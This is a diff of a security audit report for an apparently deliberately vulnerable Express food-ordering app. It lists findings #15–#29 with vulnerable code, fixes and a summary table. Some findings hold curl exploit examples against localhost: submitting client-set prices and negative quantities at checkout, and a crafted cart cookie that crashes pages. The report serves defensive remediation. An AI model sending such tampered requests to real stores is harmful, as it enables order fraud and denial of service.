-**File:** [`routes/orders.js`](routes/orders.js) — Lines 52–68  
-**Severity:** Medium  
+**File:** `routes/orders.js` — Lines 29–41  
+**Severity:** High | **CWE-345** | **OWASP A04: Insecure Design**
 
 **Vulnerable Code:**
 ```js
-// routes/orders.js  Lines 52-68
-router.post('/checkout', requireLogin, (req, res) => {
-  let items = [];
-  try {
-    items = JSON.parse(req.body.cart || '[]');  // ← cart comes from the client
-  } catch (err) { items = []; }
-
-  // Total is calculated using client-supplied prices — not DB prices
-  const total = items.reduce((sum, item) => sum + item.price * item.qty, 0);
-  // ...
-});
+// routes/orders.js  Lines 39-40
+res.cookie('cart', JSON.stringify(cart));   // plain JSON, no HMAC signature
+// ...
+cart = JSON.parse(req.cookies.cart || '[]'); // trusted blindly on every request
 ```
 
 **Explanation:**  
-The entire cart (including item `price` fields) is sent by the browser as a hidden `<input>` in the checkout form. Anyone can edit those values in DevTools or with a `curl` request to order items at an arbitrary price (e.g., $0.01 or even negative).
+The entire cart (item IDs, names, **prices**, quantities) is stored in a plain unsigned cookie. Any user
+can edit the cookie in their browser or via curl and change prices to any value, add items that don't
+exist, set absurd quantities, or craft malicious `name` strings that render in views. There is no server-
+side check that the cookie hasn't been tampered with.
+
+**Correct Fix:**
+```js
+// Option 1: Sign the cookie (Express supports signed cookies out-of-the-box)
+// server.js
+app.use(cookieParser(config.sessionSecret));  // pass a secret
+
+// orders.js — write:
+res.cookie('cart', JSON.stringify(cart), { signed: true });
+// read:
+const raw = req.signedCookies.cart || '[]';  // returns false if tampered
+
+// Option 2 (better): store cart server-side keyed by session, never in a cookie
+```
+
+---
+
+### 🟡 #16 — Cart Price Manipulation: Client-Trusted Price at Checkout
+
+**File:** `routes/orders.js` — Lines 52–68  
+**Severity:** Medium | **CWE-20** | **OWASP A04: Insecure Design**
+
+**Vulnerable Code:**
+```js
+// routes/orders.js  Lines 55-65
+items = JSON.parse(req.body.cart || '[]');           // cart from hidden form field
+const total = items.reduce((sum, item) => sum + item.price * item.qty, 0); // client price
+```
+
+**Explanation:**  
+The cart JSON — including the `price` field — is submitted as a hidden input in the checkout form.
+A user can intercept this in browser DevTools or curl and submit any price (e.g. $0.001 or negative).
 
 **Exploit Example:**
 ```bash
 curl -X POST http://localhost:3000/checkout \
-  -H "Cookie: sid=<your_session>" \
-  -d 'cart=[{"id":7,"name":"Veg Thali","price":0.01,"qty":1}]'
+  -H "Cookie: sid=<session>" \
+  -d 'cart=[{"id":7,"name":"Veg Thali","price":0.001,"qty":99}]'
+# Orders 99 Thalis for $0.099 total
 ```
 
 **Correct Fix:**
 ```js
-// routes/orders.js — always re-fetch prices from the database, never trust the client
+// routes/orders.js — re-fetch prices from DB; never trust client-supplied prices
 router.post('/checkout', requireLogin, (req, res) => {
   let items = [];
   try { items = JSON.parse(req.body.cart || '[]'); } catch { items = []; }
@@ -596,148 +630,301 @@ router.post('/checkout', requireLogin, (req, res) => {
   const verifiedItems = [];
   for (const item of items) {
     const product = db.get('SELECT * FROM products WHERE id = ?', item.id);
-    if (!product) continue;  // skip unknown products
-    const qty = Math.max(1, parseInt(item.qty, 10) || 1);
+    if (!product) continue;
+    const qty = Math.max(1, Math.min(100, parseInt(item.qty, 10) || 1));
     total += product.price * qty;
     verifiedItems.push({ id: product.id, name: product.name, price: product.price, qty });
   }
-
-  if (!verifiedItems.length) return res.redirect('/cart');
-
-  const order = db.run('INSERT INTO orders (user_id, total, status, created_at) VALUES (?, ?, ?, ?)',
-    req.user.id, total, 'paid', new Date().toISOString());
-  for (const item of verifiedItems) {
-    db.run('INSERT INTO order_items (order_id, product_id, name, price, qty) VALUES (?, ?, ?, ?, ?)',
-      order.lastInsertRowid, item.id, item.name, item.price, item.qty);
-  }
-  res.cookie('cart', JSON.stringify([]));
-  res.redirect('/orders/' + order.lastInsertRowid);
+  // ... proceed with verifiedItems and server-calculated total
 });
 ```
 
 ---
 
-### 🟡 #14 — Full Stack Trace and SQL Query Exposed to End Users
+### 🟡 #17 — Negative / Zero Quantity Abuse in Cart
 
-**File:** [`server.js`](server.js) — Lines 55–63 and [`views/error.ejs`](views/error.ejs) — Lines 7–15  
-**Severity:** Medium  
+**File:** `routes/orders.js` — Lines 35, 37  
+**Severity:** Medium | **CWE-20** | **OWASP A04: Insecure Design**
 
 **Vulnerable Code:**
 ```js
-// server.js  Lines 55-63
-app.use((err, req, res, next) => {
-  console.error(err);
-  res.status(500).render('error', {
-    title: 'Something broke',
-    message: err.message,
-    stack: err.stack,      // ← full Node.js stack trace sent to browser
-    sql: err.sql || '',    // ← raw SQL query sent to browser
-  });
-});
+// routes/orders.js  Lines 35-37
+if (existing) {
+  existing.qty += Number(req.body.qty) || 1;   // can be negative, e.g. -999
+} else {
+  cart.push({ ..., qty: Number(req.body.qty) || 1 });
+}
 ```
 
 **Explanation:**  
-Stack traces and raw SQL strings reveal internal implementation details — file paths, library versions, table names, column names, query structure — giving attackers a detailed blueprint for further attacks. Triggering the SQL error path (e.g., via SQLi) also echoes back the injected query.
+`req.body.qty` is cast to a number but never validated for range. Sending a negative quantity like `-100`
+makes the cart total negative. Combined with the client-trusted checkout price, a user could submit an
+order with a negative total, resulting in a "refund" or data corruption.
+
+**Exploit Example:**
+```bash
+curl -X POST http://localhost:3000/cart/add \
+  -H "Cookie: sid=<session>" \
+  -d "id=7&qty=-100"
+# Cart now shows Veg Thali × -100 = -$550 subtotal
+```
 
 **Correct Fix:**
 ```js
-// server.js — log details server-side only; send generic message to client
-app.use((err, req, res, next) => {
-  // Log full details to server logs (never to the client)
-  console.error('[ERROR]', err.stack);
-  if (err.sql) console.error('[SQL]', err.sql);
+// routes/orders.js — clamp qty to a sensible positive range server-side
+const qty = Math.max(1, Math.min(100, parseInt(req.body.qty, 10) || 1));
+```
 
-  res.status(500).render('error', {
-    title: 'Something went wrong',
-    message: 'An unexpected error occurred. Please try again later.',
-    stack: '',   // never expose
-    sql: '',     // never expose
-  });
+---
+
+### 🟡 #18 — Session Cookie Missing `HttpOnly`, `Secure`, `SameSite` Flags
+
+**File:** `routes/auth.js` — Line 13  
+**Severity:** Medium | **CWE-614** | **OWASP A02: Cryptographic Failures**
+
+**Vulnerable Code:**
+```js
+// routes/auth.js  Line 13
+res.cookie('sid', sid);   // no options whatsoever
+```
+
+**Explanation:**  
+- **No `HttpOnly`** → JavaScript can read `document.cookie` and steal the session token (amplifies any XSS).  
+- **No `SameSite`** → Cookie is sent on cross-site requests, enabling CSRF attacks.  
+- **No `Secure`** → Cookie may be transmitted over plain HTTP and intercepted.
+
+**Correct Fix:**
+```js
+res.cookie('sid', sid, {
+  httpOnly: true,
+  sameSite: 'lax',
+  // secure: true,  // enable when deployed over HTTPS
+  maxAge: 8 * 60 * 60 * 1000,
 });
 ```
 
 ---
 
-### 🟡 #15 — Hardcoded Credentials and Plaintext Passwords in Source Code
+### 🟡 #19 — No Rate Limiting / Brute-Force Protection on Login
 
-**File:** [`db.js`](db.js) — Lines 6–12  
-**Severity:** Medium  
+**File:** `routes/auth.js` — Lines 38–49  
+**Severity:** Medium | **CWE-307** | **OWASP A07: Identification & Auth Failures**
 
 **Vulnerable Code:**
 ```js
-// db.js  Lines 6-12
-const USERS = [
-  ['admin', 'admin123',    'admin@example.com', 'Admin Office, Block A', 'admin'],
-  ['priya', 'password123', 'priya@example.com', 'Hostel 2, Room 214',   'customer'],
-  ['rahul', 'rahul@123',   'rahul@example.com', 'Hostel 1, Room 108',   'customer'],
+// routes/auth.js  Lines 38-49
+router.post('/login', (req, res) => {
+  // No rate limiting, no lockout, no CAPTCHA, no delay
+  const user = db.get(sql);
+  if (!user) return res.status(401).render('login', { error: 'Invalid username or password.' });
   ...
-];
+});
 ```
 
 **Explanation:**  
-Plaintext passwords committed to a repository are visible to anyone with repo access (and in git history forever). Even though these are labelled as fake, the pattern teaches bad habits and would be disastrous with real credentials.
+An attacker can make unlimited login attempts at full network speed — trivially automating a credential
+stuffing or dictionary attack against any account.
 
 **Correct Fix:**
 ```js
-// db.js — seed with properly hashed passwords; never store or commit plaintext passwords
-// Pre-generate hashes with: node -e "console.log(require('bcrypt').hashSync('admin123', 12))"
-const USERS = [
-  ['admin', '$2b$12$exampleHashForAdmin...', 'admin@example.com', 'Admin Office, Block A', 'admin'],
-  ['priya', '$2b$12$exampleHashForPriya...', 'priya@example.com', 'Hostel 2, Room 214',   'customer'],
-  // ...
-];
-// Add to .gitignore: any file with real credentials or secrets
+// npm install express-rate-limit
+const rateLimit = require('express-rate-limit');
+
+const loginLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000,  // 15-minute window
+  max: 10,                    // max 10 attempts per IP
+  message: 'Too many login attempts. Please try again in 15 minutes.',
+  standardHeaders: true,
+  legacyHeaders: false,
+});
+
+router.post('/login', loginLimiter, (req, res) => { ... });
 ```
 
 ---
 
-### 🟡 #16 — Wildcard CORS (`Access-Control-Allow-Origin: *`)
+### 🟡 #20 — Missing Security Headers (No Helmet)
 
-**File:** [`server.js`](server.js) — Line 18  
-**Severity:** Medium  
-
-**Vulnerable Code:**
-```js
-// server.js  Line 18
-app.use(cors());   // defaults to Access-Control-Allow-Origin: *
-```
+**File:** `server.js` — Line 18 area  
+**Severity:** Medium | **CWE-1021** | **OWASP A05: Security Misconfiguration**
 
 **Explanation:**  
-With a wildcard CORS policy, any website on the internet can make cross-origin requests to this server and read the responses. This can be combined with other bugs (like missing CSRF protection) to extract sensitive data from authenticated sessions.
+The app uses no HTTP security headers. Missing headers expose users to:
+
+| Missing Header | Risk |
+|---|---|
+| `X-Frame-Options` / `frame-ancestors` CSP | Clickjacking — attacker embeds app in invisible `<iframe>` |
+| `X-Content-Type-Options: nosniff` | MIME-type sniffing attacks |
+| `Content-Security-Policy` | XSS can load external scripts freely |
+| `Referrer-Policy` | Leaks URL/session info to external sites via Referer header |
+| `X-XSS-Protection` | Legacy XSS filter bypass on older browsers |
+| `Strict-Transport-Security` | Forces HTTPS once set |
 
 **Correct Fix:**
 ```js
-// server.js — restrict CORS to known, trusted origins
-app.use(cors({
-  origin: ['http://localhost:3000'],   // add your real production domain here
-  credentials: true,                   // required if cookies are sent cross-origin
+// npm install helmet
+const helmet = require('helmet');
+
+// server.js — add before other middleware
+app.use(helmet());  // sets all common security headers with safe defaults
+// Customise CSP as needed:
+app.use(helmet.contentSecurityPolicy({
+  directives: {
+    defaultSrc: ["'self'"],
+    scriptSrc:  ["'self'"],
+    styleSrc:   ["'self'"],
+    imgSrc:     ["'self'", 'data:'],
+  },
 }));
 ```
 
 ---
 
-### 🟡 #17 — No CSRF Protection on State-Changing Forms
+### 🟡 #21 — Full Stack Trace & Raw SQL Exposed to End Users
 
-**File:** All route handlers (`routes/auth.js`, `routes/orders.js`, etc.)  
-**Severity:** Medium  
+**File:** `server.js` — Lines 55–63 and `views/error.ejs` — Lines 7–15  
+**Severity:** Medium | **CWE-209** | **OWASP A05: Security Misconfiguration**
+
+**Vulnerable Code:**
+```js
+// server.js  Lines 55-63
+app.use((err, req, res, next) => {
+  res.status(500).render('error', {
+    message: err.message,
+    stack: err.stack,    // full Node.js stack trace → browser
+    sql: err.sql || '',  // raw SQL query → browser
+  });
+});
+```
 
 **Explanation:**  
-There are no CSRF tokens on any of the POST forms (profile update, checkout, logout, etc.). A malicious website can silently trigger state-changing requests on behalf of a logged-in victim. This is especially dangerous combined with #16 (open CORS).
+Exposing stack traces reveals file paths, library versions, and internal logic. Exposing the raw SQL
+query in an error (especially after triggering an injection attempt) gives the attacker a detailed map
+of the database schema and query structure.
 
 **Correct Fix:**
 ```js
-// Install: npm install csurf
-const csrf = require('csurf');
-const csrfProtection = csrf({ cookie: true });
-
-// Apply globally in server.js
-app.use(csrfProtection);
-
-// Pass csrfToken to every view:
-app.use((req, res, next) => {
-  res.locals.csrfToken = req.csrfToken();
-  next();
+// server.js — log details server-side only
+app.use((err, req, res, next) => {
+  console.error('[ERROR]', err.stack);
+  if (err.sql) console.error('[SQL]', err.sql);
+  res.status(500).render('error', {
+    title: 'Something went wrong',
+    message: 'An unexpected error occurred. Please try again later.',
+    stack: '',
+    sql: '',
+  });
 });
+```
+
+---
+
+### 🟡 #22 — Hardcoded Plaintext Passwords in Source Code
+
+**File:** `db.js` — Lines 6–12  
+**Severity:** Medium | **CWE-798** | **OWASP A02: Cryptographic Failures**
+
+**Vulnerable Code:**
+```js
+// db.js  Lines 6-12
+const USERS = [
+  ['admin', 'admin123',    'admin@example.com', ...],
+  ['priya', 'password123', 'priya@example.com', ...],
+  ['rahul', 'rahul@123',   'rahul@example.com', ...],
+  ...
+];
+```
+
+**Explanation:**  
+Passwords are committed as plaintext strings in version-controlled source code. They appear in git history
+permanently. Even with "fake" data, this pattern normalises extremely dangerous behaviour.
+
+**Correct Fix:**
+```js
+// db.js — store only pre-computed bcrypt hashes, never plaintext
+// Generate: node -e "console.log(require('bcrypt').hashSync('admin123', 12))"
+const USERS = [
+  ['admin', '$2b$12$...hashhere...', 'admin@example.com', 'Admin Office, Block A', 'admin'],
+  ...
+];
+```
+
+---
+
+### 🟡 #23 — API Key Hardcoded Directly in Source Code (Not in `.env`)
+
+**File:** `config.js` — Line 26  
+**Severity:** Medium | **CWE-312** | **OWASP A02: Cryptographic Failures**
+
+**Vulnerable Code:**
+```js
+// config.js  Line 26
+paymentApiKey: 'FAKE-sk-test-not-a-real-key',  // hardcoded in source, not read from env
+```
+
+**Explanation:**  
+All other secrets (`SESSION_SECRET`, `DB_PASSWORD`) are at least read from environment variables.
+The `paymentApiKey` is hardcoded directly in source — it cannot be rotated without a code change, and
+it is always committed to git history regardless of `.gitignore`. In production this would expose a live
+payment API key to anyone with repo read access.
+
+**Correct Fix:**
+```js
+// config.js — always read secrets from environment variables
+module.exports = {
+  // ...
+  paymentApiKey: process.env.PAYMENT_API_KEY || (() => { throw new Error('PAYMENT_API_KEY is not set'); })(),
+};
+```
+```bash
+# .env
+PAYMENT_API_KEY=sk_test_your_real_key_here
+```
+
+---
+
+### 🟡 #24 — Wildcard CORS (`Access-Control-Allow-Origin: *`)
+
+**File:** `server.js` — Line 18  
+**Severity:** Medium | **CWE-942** | **OWASP A05: Security Misconfiguration**
+
+**Vulnerable Code:**
+```js
+// server.js  Line 18
+app.use(cors());  // defaults to Access-Control-Allow-Origin: *
+```
+
+**Explanation:**  
+Any website on the internet can make cross-origin requests to this server and read the responses. Combined
+with missing CSRF protection and missing `HttpOnly` flags, an attacker-controlled site can silently read
+API responses on behalf of logged-in victims.
+
+**Correct Fix:**
+```js
+app.use(cors({
+  origin: ['http://localhost:3000'],   // whitelist only trusted origins
+  credentials: true,
+}));
+```
+
+---
+
+### 🟡 #25 — No CSRF Protection on Any State-Changing Forms
+
+**File:** All route handlers  
+**Severity:** Medium | **CWE-352** | **OWASP A01: Broken Access Control**
+
+**Explanation:**  
+None of the POST forms (profile update, checkout, logout, review submission, etc.) include CSRF tokens.
+A malicious website can silently submit these forms on behalf of a logged-in victim using a hidden form
+or `fetch()`. Particularly dangerous because the session cookie has no `SameSite` attribute (#18).
+
+**Correct Fix:**
+```js
+// npm install csurf
+const csrf = require('csurf');
+app.use(csrf({ cookie: true }));
+app.use((req, res, next) => { res.locals.csrfToken = req.csrfToken(); next(); });
 ```
 ```html
 <!-- Add to every form in every .ejs view -->
@@ -746,61 +933,208 @@ app.use((req, res, next) => {
 
 ---
 
-### 🟡 #18 — `.env` File Committed to the Repository
+### 🟡 #26 — `.env` File Committed to Repository
 
-**File:** [`.env`](.env)  
-**Severity:** Medium  
-
-**Vulnerable Code:**
-```
-# .env
-HOST=127.0.0.1
-PORT=3000
-SESSION_SECRET=FAKE-session-secret-do-not-use-this-value
-DB_PASSWORD=FAKE-db-password-not-a-real-password
-```
+**File:** `.env`  
+**Severity:** Medium | **CWE-312** | **OWASP A02: Cryptographic Failures**
 
 **Explanation:**  
-The `.env` file is tracked by git and thus committed to the repository history. In a real project this would expose secrets to everyone with repo access, and the secrets would remain accessible in `git log` even after deletion. `.env` files must always be in `.gitignore`.
+Although `.env` appears in `.gitignore`, the file was committed before the ignore rule was added — it
+exists in the current working tree and in the git object history. Anyone cloning the repo (including the
+clone we just did) receives a copy of all secrets. Deleting the file without purging git history does not
+help.
 
 **Correct Fix:**
 ```bash
-# 1. Remove .env from git tracking (do NOT delete the file itself)
-echo ".env" >> .gitignore
-git rm --cached .env
-git commit -m "chore: stop tracking .env"
+# Remove .env from all git history (destructive — coordinate with team first)
+git filter-branch --force --index-filter \
+  'git rm --cached --ignore-unmatch .env' \
+  --prune-empty --tag-name-filter cat -- --all
+git push --force --all
 
-# 2. Provide a .env.example with dummy values for documentation
+# Going forward — provide a safe template instead
 cp .env .env.example
-# Edit .env.example to replace real values with obvious placeholders
-git add .env.example
-git commit -m "chore: add .env.example template"
+# Replace real values in .env.example with obvious placeholders
+echo ".env" >> .gitignore
+git add .env.example .gitignore && git commit -m "chore: remove .env, add template"
 ```
 
 ---
 
-## Summary Table
+### 🟡 #27 — Sessions Never Expire: Unbounded Memory Leak / DoS
 
-| # | Vulnerability | CWE | OWASP Top 10 (2021) |
-|---|---------------|-----|---------------------|
-| 1 | SQL Injection — Login | CWE-89 | A03: Injection |
-| 2 | SQL Injection — Search | CWE-89 | A03: Injection |
-| 3 | RCE via `eval()` | CWE-95 | A03: Injection |
-| 4 | OS Command Injection | CWE-78 | A03: Injection |
-| 5 | Path Traversal | CWE-22 | A01: Broken Access Control |
-| 6 | Missing Admin Auth | CWE-862 | A01: Broken Access Control |
-| 7 | IDOR on Orders | CWE-639 | A01: Broken Access Control |
-| 8 | Privilege Escalation | CWE-269 | A01: Broken Access Control |
-| 9 | Stored XSS | CWE-79 | A03: Injection |
-| 10 | Weak Hashing (MD5) | CWE-916 | A02: Cryptographic Failures |
-| 11 | Guessable Session ID | CWE-330 | A07: Identification & Auth Failures |
-| 12 | Insecure Cookie Flags | CWE-614 | A02: Cryptographic Failures |
-| 13 | Client-Trusted Price | CWE-20 | A04: Insecure Design |
-| 14 | Stack Trace Disclosure | CWE-209 | A05: Security Misconfiguration |
-| 15 | Hardcoded Credentials | CWE-798 | A02: Cryptographic Failures |
-| 16 | Wildcard CORS | CWE-942 | A05: Security Misconfiguration |
-| 17 | No CSRF Protection | CWE-352 | A01: Broken Access Control |
-| 18 | `.env` in Repo | CWE-312 | A02: Cryptographic Failures |
+**File:** `routes/auth.js` — Lines 6, 10–14  
+**Severity:** Medium | **CWE-400** | **OWASP A07: Identification & Auth Failures**
+
+**Vulnerable Code:**
+```js
+// routes/auth.js  Line 6
+const sessions = {};   // grows forever, never pruned
+
+// Lines 10-14 — sessions are added but never removed (logout doesn't delete either)
+function startSession(res, userId) {
+  const sid = String(Date.now()) + '-' + userId;
+  sessions[sid] = { userId, createdAt: Date.now() };
+  ...
+}
+```
+
+**Explanation:**  
+Every login adds a new entry to `sessions`. Nothing ever removes entries — not logout (see #14), not a
+time-based cleanup. Over time, or under a bot attack creating thousands of accounts and logins, the process
+RAM grows without bound. Old sessions also remain valid forever with no expiry, meaning stolen tokens
+never become stale.
+
+**Correct Fix:**
+```js
+// routes/auth.js — set an expiry on each session and prune periodically
+const SESSION_TTL_MS = 8 * 60 * 60 * 1000; // 8 hours
+
+function startSession(res, userId) {
+  const sid = crypto.randomBytes(32).toString('hex');
+  sessions[sid] = { userId, createdAt: Date.now(), expiresAt: Date.now() + SESSION_TTL_MS };
+  res.cookie('sid', sid, { httpOnly: true, sameSite: 'lax', maxAge: SESSION_TTL_MS });
+}
+
+// Prune expired sessions every 30 minutes
+setInterval(() => {
+  const now = Date.now();
+  for (const sid of Object.keys(sessions)) {
+    if (sessions[sid].expiresAt < now) delete sessions[sid];
+  }
+}, 30 * 60 * 1000);
+
+// Also update session lookup to reject expired sessions:
+req.session = sid && sessions[sid] && sessions[sid].expiresAt > Date.now()
+  ? sessions[sid]
+  : null;
+```
+
+---
+
+### 🟡 #28 — Malformed Cart Cookie Crashes Middleware (Application DoS)
+
+**File:** `server.js` — Lines 33–39  
+**Severity:** Medium | **CWE-755** | **OWASP A05: Security Misconfiguration**
+
+**Vulnerable Code:**
+```js
+// server.js  Lines 33-39
+let cart = [];
+try {
+  cart = JSON.parse(req.cookies.cart || '[]'); // catches JSON.parse errors only
+} catch (err) {
+  cart = [];
+}
+res.locals.cartCount = cart.reduce((total, item) => total + item.qty, 0); // ← no guard
+```
+
+**Explanation:**  
+The `try/catch` only catches `JSON.parse` failures. If the cookie contains valid JSON that is **not an
+array** (e.g. `{}`, `"hello"`, `42`), `JSON.parse` succeeds and `cart` is set to a non-array value.
+Then `cart.reduce(...)` throws `TypeError: cart.reduce is not a function`, which is an **uncaught
+synchronous error inside middleware**, crashing that request with a 500 and leaking a stack trace (#21).
+
+An attacker can set `document.cookie = 'cart={}'` or craft a request with `Cookie: cart={}` to reliably
+crash every page load for that session.
+
+**Exploit Example:**
+```bash
+curl http://localhost:3000/ -H 'Cookie: cart={"injected":true}'
+# → 500 TypeError: cart.reduce is not a function (+ full stack trace in browser)
+```
+
+**Correct Fix:**
+```js
+// server.js — validate that parsed value is actually an array
+let cart = [];
+try {
+  const parsed = JSON.parse(req.cookies.cart || '[]');
+  cart = Array.isArray(parsed) ? parsed : [];
+} catch (err) {
+  cart = [];
+}
+res.locals.cartCount = cart.reduce((total, item) => total + (Number(item.qty) || 0), 0);
+```
+
+---
+
+### 🟡 #29 — Known Vulnerable Dependency: Lodash 4.17.15
+
+**File:** `package.json` — Line 21  
+**Severity:** Medium | **CWE-1035** | **OWASP A06: Vulnerable & Outdated Components**
+
+**Vulnerable Code:**
+```json
+// package.json  Line 21
+"lodash": "4.17.15"
+```
+
+**Explanation:**  
+Lodash 4.17.15 is pinned to an **exact vulnerable version** (no `^` range). This version is affected by:
+
+| CVE | Issue | Severity |
+|-----|-------|----------|
+| **CVE-2021-23337** | `_.template` command injection — if user input is passed to `_.template`, arbitrary code runs | High |
+| **CVE-2020-8203** | Prototype pollution via `_.merge`, `_.mergeWith`, `_.defaultsDeep` | High |
+| **CVE-2019-10744** | Prototype pollution via `_.defaultsDeep` | Critical |
+
+The app uses `_.sortBy` (server.js line 45), which is safe. However, the vulnerable functions exist in the
+bundle and could be called accidentally or through future code additions. Using a known-vulnerable pinned
+version is a maintenance and supply-chain risk.
+
+**Correct Fix:**
+```bash
+# Upgrade to the latest patched version
+npm install lodash@latest
+
+# Or — since only _.sortBy is used, replace with native JS and drop lodash entirely:
+```
+```js
+// server.js — replace:
+//   const products = db.all('SELECT * FROM products');
+//   res.render('home', { products: _.sortBy(products, 'name') });
+// with:
+const products = db.all('SELECT * FROM products ORDER BY name ASC');
+res.render('home', { products });
+// Then remove: const _ = require('lodash'); and lodash from package.json
+```
+
+---
+
+## Complete Summary Table
+
+| # | Vulnerability | Severity | CWE | OWASP 2021 |
+|---|---------------|----------|-----|------------|
+| 1 | SQL Injection — Login | 🔴 Critical | CWE-89 | A03: Injection |
+| 2 | SQL Injection — Search | 🔴 Critical | CWE-89 | A03: Injection |
+| 3 | RCE via `eval()` — Coupon | 🔴 Critical | CWE-95 | A03: Injection |
+| 4 | OS Command Injection — Export | 🔴 Critical | CWE-78 | A03: Injection |
+| 5 | Path Traversal — Receipt | 🔴 Critical | CWE-22 | A01: Broken Access Control |
+| 6 | No Auth on Admin Panel | 🔴 Critical | CWE-862 | A01: Broken Access Control |
+| 7 | Reflected XSS — Search | 🔴 Critical | CWE-79 | A03: Injection |
+| 8 | Stored XSS — Reviews | 🟠 High | CWE-79 | A03: Injection |
+| 9 | IDOR — Order Details | 🟠 High | CWE-639 | A01: Broken Access Control |
+| 10 | Privilege Escalation via Role | 🟠 High | CWE-269 | A01: Broken Access Control |
+| 11 | Weak Hashing — MD5 Unsalted | 🟠 High | CWE-916 | A02: Cryptographic Failures |
+| 12 | Guessable Session ID | 🟠 High | CWE-330 | A07: Auth Failures |
+| 13 | Open Redirect — `next` param | 🟠 High | CWE-601 | A01: Broken Access Control |
+| 14 | Session Not Killed on Logout | 🟠 High | CWE-613 | A07: Auth Failures |
+| 15 | Unsigned Cart Cookie | 🟠 High | CWE-345 | A04: Insecure Design |
+| 16 | Client-Trusted Price at Checkout | 🟡 Medium | CWE-20 | A04: Insecure Design |
+| 17 | Negative Quantity in Cart | 🟡 Medium | CWE-20 | A04: Insecure Design |
+| 18 | Cookie Missing Security Flags | 🟡 Medium | CWE-614 | A02: Cryptographic Failures |
+| 19 | No Brute-Force Protection | 🟡 Medium | CWE-307 | A07: Auth Failures |
+| 20 | Missing Security Headers | 🟡 Medium | CWE-1021 | A05: Misconfiguration |
+| 21 | Stack Trace / SQL in Error Page | 🟡 Medium | CWE-209 | A05: Misconfiguration |
+| 22 | Hardcoded Plaintext Passwords | 🟡 Medium | CWE-798 | A02: Cryptographic Failures |
+| 23 | API Key in Source Code | 🟡 Medium | CWE-312 | A02: Cryptographic Failures |
+| 24 | Wildcard CORS | 🟡 Medium | CWE-942 | A05: Misconfiguration |
+| 25 | No CSRF Protection | 🟡 Medium | CWE-352 | A01: Broken Access Control |
+| 26 | `.env` Committed to Git | 🟡 Medium | CWE-312 | A02: Cryptographic Failures |
+| 27 | Sessions Never Expire (Memory Leak) | 🟡 Medium | CWE-400 | A07: Auth Failures |
+| 28 | Malformed Cart Cookie Crashes App | 🟡 Medium | CWE-755 | A05: Misconfiguration |
+| 29 | Vulnerable Dependency — Lodash 4.17.15 | 🟡 Medium | CWE-1035 | A06: Outdated Components |
 
 ---
 
